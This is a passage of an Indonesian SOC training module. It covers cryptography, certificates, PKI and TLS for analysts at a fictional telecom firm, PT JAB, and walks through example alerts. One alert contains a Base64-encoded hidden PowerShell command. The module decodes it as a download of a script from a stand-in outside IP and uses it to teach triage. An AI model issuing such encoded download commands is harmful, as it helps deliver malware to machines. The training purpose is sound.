**Contoh di PT JAB:** kedua jenis ada di sekitar portal. Kolom NIK pelanggan di database portal dienkripsi (salah satu control di lapisan data, lihat Day 01 bagian 2.3); itu symmetric encryption, karena aplikasi yang sama mengenkripsi saat menyimpan dan mendekripsi saat menampilkan. Kunci itu harus disimpan terpisah dari database, misalnya di layanan pengelola kunci; bila disimpan di server yang sama, enkripsinya kehilangan banyak arti (pelajaran yang sama dengan password di bagian 1.3). Di sisi lain, sertifikat portal berisi public key, sedangkan private key pasangannya hanya ada di perangkat yang melayani HTTPS portal. Bila private key itu bocor, penyerang bisa menyamar sebagai portal.

**Beda dengan hashing:** keduanya mengubah data menjadi tampak acak, tetapi enkripsi (symmetric maupun asymmetric) bisa dibalik dengan kunci yang tepat, sedangkan hash tidak bisa dibalik sama sekali.

**Salah paham umum:**
- "Asymmetric lebih aman daripada symmetric, jadi semua data sebaiknya dienkripsi asymmetric." Keduanya aman bila dipakai dengan benar; yang berbeda adalah kegunaannya. Asymmetric jauh lebih lambat, sehingga data besar selalu dienkripsi symmetric, dan asymmetric dipakai untuk urusan kunci dan identitas.
- "Public key harus dirahasiakan." Public key memang dibuat untuk dibagikan. Yang wajib dijaga adalah private key.

### 1.5 Digital signature

Pertanyaan kelima Sari kembali ke hari pertama orientasi: pelanggan yang menyangkal pernah mengganti paket. Log portal, OTP, dan email konfirmasi memberi bukti yang kuat tetapi belum mutlak. Day 01 menyebut non-repudiation (bukti yang membuat pelaku tidak bisa menyangkal tindakannya) yang paling kuat di dunia digital memakai digital signature.

**Apa itu:** digital signature adalah transformasi kriptografis atas data yang, bila diterapkan dengan benar, mendukung verifikasi asal-usul data (origin authentication), keutuhan data (integrity), dan non-repudiation dari penandatangan [S16]. Digital signature dibuat dengan private key penandatangan dan diverifikasi dengan public key-nya [S16]. Glosarium NIST juga menegaskan apa yang tidak diberikannya: digital signature tidak memberi kerahasiaan [S16]. Dokumen yang ditandatangani tetap bisa dibaca siapa pun.

**Analogi:** tanda tangan dan stempel di surat resmi, ditambah segel yang robek bila isi surat diubah. Siapa pun bisa mencocokkan tanda tangan dengan contoh yang terdaftar, tetapi hanya pemiliknya yang bisa membuatnya. Batasnya: tanda tangan basah bisa ditiru, sedangkan digital signature tidak bisa dibuat tanpa private key. Sebaliknya, digital signature hanya membuktikan bahwa private key tertentu dipakai, bukan siapa orang yang menekan tombolnya. Bila private key dicuri, pencurinya bisa menandatangani atas nama pemilik.

**Cara kerja:** penandatangan tidak menandatangani seluruh dokumen secara langsung, melainkan hash-nya, karena hash pendek dan mewakili seluruh isi [S16].

```
MENANDATANGANI (pengirim)                     MEMVERIFIKASI (penerima, siapa pun)
  dokumen                                       dokumen yang diterima    tanda tangan
     | hash (SHA-256)                              | hash (SHA-256)          | dibuka dengan public key pengirim
     v                                             v                         v
  hash dokumen                                  hash hitungan sendiri  ==  hash dari tanda tangan ?
     | diproses dengan PRIVATE KEY pengirim           sama   : asli dari pemegang private key, tidak berubah
     v                                                 beda   : dokumen diubah, atau bukan dari pemilik kunci
  tanda tangan, dikirim bersama dokumen
```

Di sini terlihat kenapa collision pada hash berbahaya (bagian 1.2): bila penyerang bisa membuat dokumen lain dengan hash yang sama, tanda tangan untuk dokumen asli juga "cocok" untuk dokumen palsu. Itu sebabnya MD5 tidak boleh dipakai untuk digital signature [S8] dan tanda tangan modern memakai SHA-256 atau yang lebih kuat.

**Contoh di PT JAB:** ada tiga tempat digital signature terlihat dalam pekerjaan SOC.

- **Tanda tangan kode.** Program resmi Windows dan aplikasi vendor ditandatangani pembuatnya. EDR mencatat apakah file punya tanda tangan yang valid dan siapa penandatangannya. File `u.ps1` di alert `SOC-2027-0831` tidak bertanda tangan, satu lagi alasan untuk mencurigainya (bagian 2.2). Tanda tangan valid tidak otomatis berarti aman, karena sertifikat penandatangan kode juga bisa dicuri, tetapi file tanpa tanda tangan yang mengaku sebagai "update" adalah tanda bahaya.
- **Sertifikat.** Setiap sertifikat adalah data yang ditandatangani CA (bagian 1.6). Browser memverifikasi tanda tangan itu setiap kali membuka portal.
- **Penyangkalan perubahan paket.** Untuk transaksi bernilai besar, seperti kontrak layanan korporat, PT JAB bisa meminta persetujuan dengan tanda tangan elektronik yang memakai sertifikat milik penandatangan. Untuk pelanggan rumahan, log yang dikirim ke SIEM (sistem pengumpul log SOC) ditambah OTP tetap menjadi bukti utama, karena pelanggan biasa tidak memegang private key sendiri.

**Beda digital signature dengan encryption:** encryption menjaga kerahasiaan dan memakai public key penerima untuk mengunci. Digital signature menjaga keaslian dan keutuhan, memakai private key pengirim, dan tidak menyembunyikan isi. Dokumen bisa ditandatangani saja, dienkripsi saja, atau keduanya.

**Beda digital signature dengan tanda tangan hasil scan:** gambar tanda tangan yang ditempel di PDF bisa disalin ke dokumen mana pun dan tidak berubah bila isi dokumen diubah. Digital signature terikat pada isi: satu huruf diubah, verifikasinya gagal.

### 1.6 Certificate dan CA

Alert ketiga, `SOC-2027-0832`, menyebut sertifikat `portal.jab.example` akan kedaluwarsa dalam 14 hari. Sebelum membahas akibatnya, jawab dulu pertanyaan keenam Sari: sertifikat itu apa, dan kenapa browser memercayainya?

**Apa itu:** certificate (sertifikat public key, formatnya disebut X.509) adalah dokumen digital yang mengikat sebuah public key ke sebuah subjek, misalnya nama domain, ditandatangani oleh CA, dan berlaku untuk jangka waktu terbatas [S17]. CA (certificate authority, disebut juga certification authority) adalah pihak tepercaya yang menerbitkan dan mencabut sertifikat [S18]. Karena sertifikat ditandatangani, siapa pun bisa memeriksa keasliannya sendiri, sehingga sertifikat boleh dikirim lewat jalur yang tidak aman [S17].

Isi utama sertifikat menurut RFC 5280 dirangkum di tabel berikut; cari kolom "Yang dicek analyst" saat membaca sertifikat di alert [S17].

| Field | Isi | Yang dicek analyst |
|---|---|---|
| Version | Versi format, hampir selalu v3 | Jarang perlu dicek |
| Serial number | Nomor unik dari CA penerbit | Dipakai untuk mencari di daftar pencabutan |
| Signature algorithm | Algoritma tanda tangan CA, mis. `sha256WithRSAEncryption` | Algoritma lama berbasis MD5 atau SHA-1 adalah tanda bahaya |
| Issuer | Nama CA penerbit | Apakah CA yang dikenal organisasi |
| Validity | `notBefore` dan `notAfter`, awal dan akhir masa berlaku | Apakah sudah atau hampir kedaluwarsa |
| Subject | Nama pemegang | Pada sertifikat web modern, nama domain utama ada di SAN |
| Subject public key info | Public key pemegang dan jenis algoritmanya | Jenis dan panjang kunci |
| Subject alternative name (SAN) | Daftar nama domain yang dicakup | Apakah nama situs yang dibuka ada di daftar ini |
| Basic constraints | Apakah sertifikat ini milik sebuah CA | Sertifikat situs biasa harus bertanda bukan CA |
| Key usage / extended key usage | Untuk apa kunci boleh dipakai (server TLS, tanda tangan kode, dan lain-lain) | Apakah pemakaiannya sesuai |

**Analogi:** KTP server. KTP mengikat foto dan nama ke satu orang, diterbitkan Dukcapil, punya masa berlaku, dan bisa diblokir bila hilang. Petugas bank memercayai KTP bukan karena mengenal pemiliknya, tetapi karena memercayai penerbitnya. Batasnya: KTP membuktikan identitas, bukan niat baik. Sertifikat web yang paling umum hanya membuktikan bahwa pemohon menguasai nama domain itu saat sertifikat dibuat; situs phishing pun bisa mendapat sertifikat yang sah untuk domain miliknya sendiri.

**Cara kerja:** urutan hidup sebuah sertifikat situs kira-kira begini.

1. Tim pengelola situs membuat pasangan kunci. Private key tetap di server.
2. Mereka mengirim permohonan ke CA berisi public key dan nama domain.
3. CA memeriksa bahwa pemohon benar menguasai domain itu, lalu membuat sertifikat dan menandatanganinya dengan private key CA.
4. Sertifikat dipasang di server. Setiap kali browser tersambung, server mengirim sertifikat ini.
5. Browser memeriksa: tanda tangan CA valid, nama situs ada di SAN, tanggal hari ini di antara `notBefore` dan `notAfter`, rantai sampai ke CA yang dipercaya, dan sertifikat tidak dicabut [S17].
6. Sebelum `notAfter`, sertifikat harus diperbarui (diterbitkan ulang). Bila private key bocor, sertifikat dicabut lebih awal (revocation).

Kenapa ada tanggal kedaluwarsa? Makin lama sebuah sertifikat berlaku, makin lama pula sertifikat itu bisa disalahgunakan bila private key-nya bocor atau informasi di dalamnya sudah tidak benar, dan pencabutan tidak selalu sampai ke semua browser. Karena itu industri memperpendek masa berlaku. Forum CA dan pembuat browser (CA/Browser Forum) pada 11 April 2025 menyetujui Ballot SC-081v3 yang menurunkan masa berlaku maksimum sertifikat TLS publik dari 398 hari menjadi 47 hari secara bertahap antara Maret 2026 dan Maret 2029; Apple, Google, Microsoft, dan Mozilla semuanya memilih setuju [S24]. Tahapannya: 200 hari mulai 15 Maret 2026, 100 hari mulai 15 Maret 2027, dan 47 hari mulai 15 Maret 2029 [S25][S26]. Akibat praktisnya, perpanjangan sertifikat tidak lagi bisa diurus manual setahun sekali; harus diotomatisasi.

**Contoh di PT JAB:** sertifikat `portal.jab.example` diterbitkan 2027-05-12 dan berlaku sampai 2027-08-20, tepat 100 hari, batas maksimum yang berlaku sejak Maret 2027. Dulu tim infrastruktur memperpanjangnya setahun sekali dengan pengingat di kalender. Sejak masa berlaku dipersingkat, perpanjangan untuk portal belum diotomatisasi, dan alert `SOC-2027-0832` muncul dari pemantauan sertifikat di SIEM yang memberi peringatan 14 hari sebelum kedaluwarsa. Isi sertifikatnya dibaca di bagian 2.4.

**Beda certificate dengan public key:** public key hanyalah angka. Certificate adalah public key ditambah nama pemiliknya, masa berlaku, dan tanda tangan CA yang menjamin pasangan itu. Tanpa certificate, browser tidak bisa membedakan public key portal asli dari public key penyamar.

**Salah paham umum:**
- "Sertifikat berisi private key." Sertifikat hanya berisi public key dan boleh dilihat siapa pun. Private key disimpan terpisah di server. Yang wajib dijaga saat memindahkan sertifikat antar server adalah file private key-nya.

### 1.7 PKI dan rantai kepercayaan

Lanjutan pertanyaan keenam Sari: browser pelanggan tidak pernah berhubungan dengan CA penerbit sertifikat portal, jadi kenapa ia percaya pada tanda tangan CA itu?

**Apa itu:** PKI (public key infrastructure) adalah kerangka untuk menerbitkan, memelihara, dan mencabut sertifikat public key [S19]. Kerangka itu mencakup kebijakan, proses, server, perangkat lunak, dan orang yang mengelola sertifikat [S19]. PKI adalah alasan sebuah sertifikat bisa dipercaya oleh pihak yang tidak pernah bertemu pemiliknya.

**Analogi:** sistem administrasi kependudukan. Kementerian (root CA) memberi wewenang kepada kantor Dukcapil daerah (intermediate CA), dan kantor daerah menerbitkan KTP (sertifikat situs). Petugas bank memercayai KTP karena mengakui kementerian di puncaknya. Batasnya: di dunia digital, daftar "kementerian" yang diakui ditentukan oleh pembuat sistem operasi dan browser, dan daftar itu berbeda sedikit antar produk. Organisasi juga bisa punya "kementerian" sendiri untuk keperluan internal.

**Cara kerja:** sertifikat diverifikasi lewat rantai (certification path). Setiap sertifikat ditandatangani sertifikat di atasnya, sampai ke trust anchor, yaitu public key CA yang sudah dipercaya sebelumnya oleh pihak yang memeriksa [S17]. Trust anchor ini adalah root CA yang tersimpan di trust store sistem operasi atau browser.

```
[Root CA]            ada di trust store browser/OS; dipercaya langsung
    | menandatangani
[Intermediate CA]    dikirim server bersama sertifikat situs
    | menandatangani
[Sertifikat situs]   portal.jab.example, berisi public key portal

Browser memeriksa dari bawah ke atas: tanda tangan setiap tingkat valid, nama issuer
cocok dengan subject di atasnya, semua masih berlaku, tidak ada yang dicabut, dan
puncaknya ada di trust store. Satu mata rantai gagal = sertifikat ditolak.
```

Pencabutan (revocation) dipakai bila private key bocor atau sertifikat salah terbit sebelum masa berlakunya habis. Cara klasiknya adalah CRL (certificate revocation list), daftar nomor seri sertifikat yang dicabut, ditandatangani dan diterbitkan berkala oleh CA [S17]. Karena CRL terbit berkala, pencabutan baru terlihat saat daftar berikutnya terbit; cara online seperti OCSP menjadi alternatifnya [S17]. Kelemahan pencabutan inilah salah satu alasan industri memilih masa berlaku yang pendek (bagian 1.6).

**Contoh di PT JAB:** PT JAB memakai dua jenis PKI.

- **PKI publik** untuk layanan yang dibuka ke pelanggan, seperti `portal.jab.example`. Sertifikatnya diterbitkan CA publik yang root-nya sudah ada di trust store semua browser, sehingga pelanggan tidak perlu memasang apa pun.
- **PKI internal** untuk perangkat dan layanan di dalam perusahaan. PT JAB punya CA internal yang root-nya dipasang ke trust store semua laptop kantor. Salah satu pemakainya adalah forward proxy web kantor `jkt-proxy01`, yang membuka (mendekripsi) HTTPS untuk domain baru atau tidak terkategori supaya isinya bisa diperiksa: proxy membuat sertifikat untuk situs tujuan dan menandatanganinya dengan CA internal, dan laptop kantor menerimanya karena root CA internal ada di trust store-nya. Cara kerja proxy itu dibahas di Day 03. Karena kuatnya posisi ini, CA internal adalah sasaran bernilai tinggi: pada insiden `INC-2026-024`, penyerang menguasai domain Active Directory PT JAB lewat template sertifikat yang salah konfigurasi.

**Beda PKI dengan CA:** CA adalah satu pihak penerbit. PKI adalah seluruh sistemnya: CA-CA, aturan penerbitan, proses verifikasi pemohon, daftar pencabutan, trust store, dan orang yang mengelolanya.

**Salah paham umum:**
- "Sertifikat buatan sendiri (self-signed) sama amannya dengan sertifikat dari CA, karena enkripsinya sama." Enkripsinya memang sama kuatnya, tetapi tidak ada pihak ketiga yang menjamin public key itu milik siapa. Bila user terbiasa menekan "lanjutkan" pada peringatan sertifikat self-signed, mereka juga akan menekannya saat penyerang memasang sertifikat palsu.

### 1.8 Key exchange

Bagian kedua dari pertanyaan keempat Sari: symmetric encryption butuh satu kunci yang sama di kedua pihak, tetapi browser pelanggan dan portal belum pernah bertukar kunci, dan semua yang mereka kirim lewat internet bisa disadap.

**Apa itu:** key exchange adalah cara dua pihak menyepakati kunci rahasia bersama lewat jalur yang bisa disadap, tanpa pernah mengirim kunci itu sendiri. Metode yang dipakai TLS 1.3 adalah keluarga Diffie-Hellman (versi ephemeral, disingkat DHE, dan versi kurva eliptik, ECDHE): setiap pihak mengirim "key share" publik, lalu masing-masing menghitung rahasia yang sama dari key share pihak lain dan rahasia miliknya sendiri [S20]. Kunci hasil kesepakatan ini menjadi session key, kunci symmetric yang hanya dipakai untuk satu sambungan.

**Analogi:** mencampur cat. Kamu dan portal sepakat terbuka memakai cat dasar kuning. Kamu menambahkan warna rahasiamu dan mengirim campurannya; portal menambahkan warna rahasianya dan mengirim campurannya. Masing-masing lalu menambahkan warna rahasianya sendiri ke campuran yang diterima, dan keduanya berakhir dengan warna akhir yang sama. Penyadap melihat kuning dan dua campuran, tetapi tidak bisa memisahkan warna rahasia dari campurannya. Batasnya: campur cat ini tidak membuktikan dengan siapa kamu bicara. Penyerang yang berdiri di tengah jalur bisa mencampur cat dengan kamu dan dengan portal secara terpisah. Itulah sebabnya key exchange di TLS selalu digabung dengan sertifikat dan tanda tangan server.

**Cara kerja:** di TLS 1.3, browser mengirim key share-nya di pesan pertama, portal membalas dengan key share-nya, dan keduanya langsung menghitung kunci rahasia yang sama [S20]. Supaya browser yakin key share itu benar dari portal, portal menandatangani rekaman handshake dengan private key yang pasangannya ada di sertifikat (pesan CertificateVerify) [S20]. Jadi sertifikat dan digital signature menjawab "dengan siapa aku bicara", key exchange menjawab "kunci apa yang kita pakai", dan symmetric encryption mengerjakan sisanya.

Ada satu keuntungan penting dari key share sementara (ephemeral) ini: forward secrecy. TLS 1.3 menghapus cara lama "static RSA", di mana browser mengenkripsi rahasia sesi dengan public key server [S20]. Pada cara lama itu, penyerang yang merekam lalu lintas hari ini dan suatu hari mencuri private key server bisa membuka semua rekaman lama. Dengan key exchange ephemeral, kunci sesi dibuang setelah sambungan selesai, dan semua metode key exchange di TLS 1.3 memberikan forward secrecy [S20].

**Contoh di PT JAB:** setiap kali seorang pelanggan membuka portal, browser-nya dan perangkat yang melayani `portal.jab.example` menyepakati session key baru. Seribu pelanggan yang login bersamaan memakai seribu kunci berbeda, dan tidak ada satu pun kunci itu yang pernah lewat jaringan. Bila suatu hari private key portal bocor, sertifikatnya harus dicabut dan diganti karena penyerang bisa menyamar sebagai portal, tetapi rekaman sambungan lama tetap tidak bisa dibuka berkat forward secrecy.

**Beda key exchange dengan encryption:** key exchange tidak mengenkripsi data pelanggan; ia hanya menghasilkan kunci. Data dienkripsi sesudahnya dengan symmetric encryption memakai kunci itu.

### 1.9 TLS dan handshake singkat

Pertanyaan terakhir Sari: apa yang terjadi saat pelanggan membuka portal? Day 02 bagian 1.10 menyebut HTTPS adalah HTTP di dalam TLS, dan nama situs (SNI) tetap terlihat di jalan. Sekarang isi "di dalam TLS" itu dibuka.

**Apa itu:** TLS (Transport Layer Security) adalah protokol yang membuat dua aplikasi bisa berkomunikasi lewat internet dengan cara yang mencegah penyadapan, pengubahan, dan pemalsuan pesan [S20]. Versi terbarunya, TLS 1.3 (RFC 8446), menjanjikan tiga hal: authentication (server selalu dibuktikan identitasnya, klien opsional), confidentiality (data hanya terlihat kedua ujung), dan integrity (perubahan data di jalan terdeteksi) [S20]. Handshake TLS adalah tahap pembuka tempat kedua pihak menyepakati versi dan cipher suite (paket algoritma), membuktikan identitas server, dan menyepakati kunci [S21]. Nama lama SSL masih sering dipakai sehari-hari ("sertifikat SSL"), padahal protokol yang berjalan sekarang adalah TLS.

**Analogi:** perkenalan resmi lewat telepon sebelum membicarakan hal rahasia. Penelepon menyebut siapa yang ingin ia hubungi, penerima menunjukkan kartu identitas yang dicap instansi resmi, keduanya menyepakati kode sandi tanpa mengucapkannya langsung, lalu sisa percakapan memakai sandi itu. Batasnya: nama orang yang dicari (SNI) diucapkan sebelum sandi disepakati, jadi masih bisa didengar orang yang menyadap.

**Cara kerja:** handshake TLS 1.3 yang disederhanakan, untuk pelanggan yang membuka portal [S20]:

```
Browser pelanggan                                         portal.jab.example
  |                                                               |
  | 1. ClientHello: versi yang didukung, daftar cipher suite,     |
  |    key share browser, SNI = portal.jab.example     [TERBUKA]  |
  | ------------------------------------------------------------> |
  |                                                               |
  | 2. ServerHello: cipher suite terpilih, key share server       |
  |                                                  [TERBUKA]    |
  | <------------------------------------------------------------ |
  |    (kedua pihak kini bisa menghitung kunci yang sama)         |
  | 3. EncryptedExtensions, Certificate (sertifikat portal),      |
  |    CertificateVerify (tanda tangan dengan private key portal),|
  |    Finished                                   [TERENKRIPSI]   |
  | <------------------------------------------------------------ |
  | 4. browser memeriksa sertifikat (bagian 1.6 dan 1.7),         |
  |    mengirim Finished                          [TERENKRIPSI]   |
  | ------------------------------------------------------------> |
  | 5. data HTTP: GET /tagihan, cookie, password  [TERENKRIPSI]   |
  | <===========================================================> |
```

Langkah 1 dan 2 terkirim terbuka karena kunci belum ada. Semua pesan handshake setelah ServerHello sudah terenkripsi [S20]. Akibatnya, perangkat di jalur masih bisa membaca versi TLS, cipher suite yang ditawarkan, dan SNI dari ClientHello, tetapi tidak bisa membaca isi permintaan HTTP. Seluruh pembukaan ini hanya butuh satu kali bolak-balik (1-RTT) sebelum data mengalir [S20], lebih cepat daripada TLS 1.2.

**Contoh di PT JAB:** di depan portal PT JAB ada WAF `jkt-waf01` (web application firewall, penyaring isi permintaan ke aplikasi web). Supaya bisa memeriksa isi permintaan, sambungan TLS dari pelanggan berakhir di WAF itu: sertifikat dan private key `portal.jab.example` dipasang di sana, WAF membuka isinya, memeriksanya, lalu meneruskannya ke server `jkt-portal01`. Artinya sertifikat yang akan kedaluwarsa harus diperbarui di WAF, bukan hanya di server portal. Di arah sebaliknya, firewall perimeter yang hanya melihat lalu lintas di jalur tetap tidak bisa membaca isi, karena tidak memegang private key portal.

**Beda TLS dengan HTTPS:** TLS adalah lapisan pengaman yang bisa membungkus banyak protokol, misalnya email (SMTP, IMAP), VPN, dan database. HTTPS adalah salah satu pemakainya: HTTP di dalam TLS.

**Salah paham umum:**
- "Data yang lewat TLS terenkripsi dari pengirim sampai pemakai akhir." TLS melindungi satu sambungan, dari satu ujung ke ujung berikutnya. Di PT JAB, sambungan pelanggan berakhir di `jkt-waf01`; dari situ ke server portal butuh perlindungan sendiri.

### 1.10 HTTPS: semua istilah Day ini bekerja bersama

Bagian ini menutup pertanyaan ketujuh Sari dengan merangkai semua istilah sebelumnya ke satu kunjungan portal, lalu menjawab apa yang terjadi bila sertifikat kedaluwarsa.

**Apa itu:** HTTPS adalah HTTP yang dikirim di dalam sambungan TLS, memakai port TCP 443 secara bawaan (Day 02). HTTPS memberi tiga perlindungan: data tidak bisa dibaca penyadap, data tidak bisa diubah tanpa ketahuan, dan browser bisa memastikan sedang bicara dengan pemilik sah nama domain itu [S21]. Ikon gembok di browser berarti ketiga syarat itu terpenuhi untuk sambungan saat itu.

**Analogi:** surat dalam amplop tersegel yang dikirim lewat kurir resmi, dan penerimanya menunjukkan KTP saat menerima. Batasnya sama dengan Day 02: amplop dan KTP tidak menjamin penerima atau isi suratnya baik. Situs phishing dengan nama domain mirip juga bisa menampilkan gembok.

**Cara kerja:** tabel berikut memetakan setiap langkah kunjungan ke istilah Day ini; baca kolom "Istilah" untuk melihat bahwa satu kunjungan memakai hampir semua yang dibahas.

| Langkah | Yang terjadi | Istilah | Bagian |
|---|---|---|---|
| 1 | Browser mengirim ClientHello dengan SNI `portal.jab.example` dan key share | TLS, key exchange | 1.8, 1.9 |
| 2 | Portal mengirim sertifikat dan tanda tangan atas handshake | Certificate, digital signature, asymmetric | 1.4, 1.5, 1.6 |
| 3 | Browser memeriksa rantai sampai root di trust store, nama di SAN, tanggal, status pencabutan | CA, PKI | 1.6, 1.7 |
| 4 | Kedua pihak menghitung session key | Key exchange, forward secrecy | 1.8 |
| 5 | Permintaan HTTP dan password pelanggan dienkripsi dengan session key | Symmetric encryption (biasanya AES) | 1.4 |
| 6 | Setiap paket data membawa pemeriksaan keutuhan; perubahan terdeteksi | Integrity, hash | 1.2, 1.9 |
| 7 | Di server, password yang diterima di-hash dengan salt dan dicocokkan | Salting, password hashing scheme | 1.3 |

**Bila sertifikat kedaluwarsa:** pada langkah 3 browser menemukan tanggal hari ini sudah lewat `notAfter`, dan pemeriksaan sertifikat gagal. Browser modern menampilkan halaman peringatan penuh dan tidak memuat portal kecuali user sengaja memaksa lanjut; aplikasi dan skrip yang memanggil portal lewat program biasanya langsung gagal tanpa pilihan lanjut. Bagi PT JAB, akibatnya adalah gangguan availability (sifat A di CIA triad): ribuan pelanggan tidak bisa membayar, dan pusat panggilan kebanjiran keluhan. Ada akibat keamanan yang lebih halus: pelanggan yang diminta "klik lanjutkan saja" sedang dilatih mengabaikan peringatan yang suatu hari bisa berarti penyamaran sungguhan.

**Contoh di PT JAB:** tim infrastruktur Agung Prabowo (Lead Infrastruktur) yang memegang perpanjangan sertifikat portal. Sari menetapkan alert `SOC-2027-0832` sebagai tiket ke tim itu dengan tenggat sebelum 2027-08-20, dan meminta perpanjangan berikutnya diotomatisasi karena masa berlaku 100 hari, dan kelak 47 hari, terlalu pendek untuk diurus manual.

**Beda HTTPS dengan "situs aman":** HTTPS menilai sambungannya, bukan pemiliknya. Pertanyaan "apakah situs ini milik PT JAB?" dijawab dengan memeriksa nama domainnya, bukan dengan melihat gembok.

## 2. Contoh nyata

Semua alert, log, isi sertifikat, dan email di bagian ini adalah keluaran ilustrasi dari organisasi fiktif PT JAB, bukan hasil eksekusi nyata. Nilai Base64 dan hash dihitung sungguhan dari teks contoh yang ditulis di setiap subbagian, tetapi file, nama, dan alamat yang dikaitkan dengannya fiktif.

### 2.1 Membuka string Base64 di alert `SOC-2027-0830`

Ini alert pertama yang dibuka Sari, tempat Gilang menulis "argumen terenkripsi". Laptop `JKT-WS-1052` (`10.10.35.52`) dipakai Rina Wulandari dari divisi Pemasaran.

```
Alert        : SOC-2027-0830   Suspicious PowerShell command line (encoded)
Waktu        : 2027-08-06 08:12:40 WIB
Host         : JKT-WS-1052 (10.10.35.52)
User         : CORP\rina.wulandari
Parent       : explorer.exe
Process      : powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand
               aQB3AHIAIABoAHQAdABwADoALwAvADEAOQAyAC4AMAAuADIALgAxADIAMQAvAHUALgBwAHMAMQAgAC0ATwB1AHQARgBpAGwAZQAgACQAZQBuAHYAOgBUAEUATQBQAFwAdQAuAHAAcwAxAA==
Catatan L1   : argumen terenkripsi, isi tidak bisa dibaca, kemungkinan skrip IT resmi
```

**Cara membaca:** tiga petunjuk langsung menunjuk Base64, bukan enkripsi. Nama parameternya `-EncodedCommand`, parameter resmi PowerShell untuk perintah dalam Base64 [S3]. Karakternya hanya huruf, angka, `+`, `/`, dan diakhiri `==`, persis alfabet dan pengisi Base64 [S1]. Pola berulang `A` di antara huruf (`aQB3AHIA...`) adalah ciri teks UTF-16LE yang di-Base64: setiap huruf biasa diikuti satu byte nol, dan byte nol itu sering muncul sebagai `A` di hasil Base64.

Panjang string bisa dicek dengan hitungan: string ini 144 karakter. Bila dibalik, hasilnya 106 byte UTF-16LE, yaitu 53 huruf dikali dua byte. 106 byte terdiri dari 35 kelompok penuh tiga byte (140 karakter) ditambah sisa satu byte (2 karakter dan `==`), total 144. Angkanya konsisten.

Hasil decode (dihitung dengan `base64 -d`, lalu diubah dari UTF-16LE ke teks biasa):

```
iwr http://192.0.2.121/u.ps1 -OutFile $env:TEMP\u.ps1
```

`iwr` adalah singkatan perintah PowerShell `Invoke-WebRequest` untuk mengunduh dari web. Perintah ini mengunduh file `u.ps1` (skrip PowerShell) dari alamat luar `192.0.2.121` lewat HTTP biasa dan menyimpannya di folder sementara user. Ditambah `-WindowStyle Hidden` (jendela disembunyikan) dan induk proses `explorer.exe` (dijalankan dari klik user, bukan dari alat IT), ini bukan pola skrip IT resmi.

**Keputusan:** catatan L1 dikoreksi: argumen di-encode Base64, bukan dienkripsi, dan isinya terbaca. Alert diteruskan ke pemeriksaan file yang diunduh (bagian 2.2).

**Variasi yang perlu dikenali:** parameter ini bisa disingkat (`-enc`, `-ec`, `-e`) [S3]; Base64 bisa muncul di tempat lain seperti isi skrip, registry, atau URL (varian base64url memakai `-` dan `_` sebagai ganti `+` dan `/`) [S1]; dan penyerang bisa menumpuk beberapa lapis encoding. Prinsipnya sama: decode sampai terbaca. Bila setelah semua lapis encoding dibuka hasilnya tetap acak, barulah kemungkinan ada enkripsi atau kompresi.

### 2.2 Membaca hash di alert `SOC-2027-0831`

Sedetik setelah perintah di bagian 2.1 berjalan, EDR menahan file yang diunduh dan membuat alert kedua.

```
Alert        : SOC-2027-0831   Suspicious file quarantined
Waktu        : 2027-08-06 08:12:43 WIB
Host         : JKT-WS-1052 (10.10.35.52)
File         : C:\Users\rina.wulandari\AppData\Local\Temp\u.ps1   (4.812 byte)
MD5          : 578e451118b911529443c468c0ec0e83
SHA1         : d1078422e6a8a933dd82b206996079bc334a4a5d
SHA256       : 10628341ada9ca6041f85a4b1f7a583606342094066b5e5576ae4c12bf069344
Signer       : (tidak bertanda tangan)
Sumber unduh : http://192.0.2.121/u.ps1
Tindakan     : quarantined
Reputasi     : SHA256 tidak dikenal (belum pernah terlihat)
```

Nilai hash di atas dihitung dari teks contoh `SOC-2027-0831 contoh berkas u.ps1`, karena file fiktif tidak bisa di-hash; panjang dan formatnya sama dengan hash file sungguhan.

**Cara membaca:**

- Cek panjang dulu: MD5 32 karakter, SHA-1 40 karakter, SHA-256 64 karakter (bagian 1.2). Panjang yang tidak cocok berarti salah salin atau salah kolom, kesalahan yang sering terjadi saat menyalin hash ke tiket.
- Pakai SHA-256 untuk dicari di layanan reputasi, untuk tiket, dan untuk blocklist. MD5 dan SHA-1 hanya dipakai bila sumber intelijen lama tidak punya SHA-256.
- "Tidak dikenal" bukan "aman". Hash yang belum pernah terlihat bisa berarti file dibuat khusus untuk PT JAB, atau diubah sedikit supaya hash-nya baru (bagian 1.2). Di alert ini, gabungan petunjuknya jelas: tidak bertanda tangan, diunduh dari IP luar lewat perintah tersembunyi, dan disimpan di folder sementara.
- Tanda tangan: skrip yang benar-benar dari tim IT PT JAB ditandatangani sertifikat penandatangan kode milik PT JAB (bagian 1.5). File ini tidak.

**Keputusan:** Sari membuka insiden `INC-2027-084` dengan severity SEV-3, meminta isolasi `JKT-WS-1052` lewat EDR sampai dipastikan apakah `u.ps1` sempat berjalan sebelum dikarantina, dan menambahkan SHA-256 serta `192.0.2.121` ke daftar blokir. Rina mengonfirmasi ia membuka lampiran dari email yang mengaku undangan rapat vendor; cara email semacam itu bekerja dibahas di Day 09.

**Kapan gagal:** blokir berdasarkan hash hanya menghentikan file yang persis sama. Penyerang yang mengubah satu karakter di `u.ps1` menghasilkan SHA-256 baru yang lolos dari blocklist. Karena itu hash dipakai bersama petunjuk perilaku (perintah tersembunyi, unduhan dari IP luar), bukan sendirian.

### 2.3 Menjawab tim aplikasi: cara menyimpan password pelanggan

Ini email tim aplikasi portal yang dibawa Sari, beserta jawaban yang ia susun bersamamu.

```
Dari    : Tim Aplikasi Portal
Kepada  : soc@jab.example
Perihal : Penyimpanan password pelanggan portal

Saat ini password pelanggan disimpan terenkripsi AES-256 di tabel customer_auth.
Kunci AES ada di file konfigurasi aplikasi di jkt-portal01. Bulan depan kami
migrasi ke versi aplikasi baru. Apakah cara ini sudah memenuhi standar?
```

Tabel berikut membandingkan tiga cara penyimpanan yang mungkin; cari kolom "Bila database dan server dicuri" karena itulah skenario yang menentukan.

| Cara | Contoh isi kolom password | Bila database dan server dicuri | Penilaian |
|---|---|---|---|
| Enkripsi AES, kunci di server yang sama | ciphertext Base64 | Penyerang memakai kunci di file konfigurasi, semua password terbuka dalam bentuk asli | Tidak sesuai. Password tidak perlu bisa dikembalikan [S13] |
| SHA-256 tanpa salt | `0f9712c97aecd62b...` (64 karakter) | Password sama ketahuan sama; password populer langsung ditemukan dengan tabel siap pakai | Tidak sesuai. Hash cepat dan tanpa salt [S11][S13] |
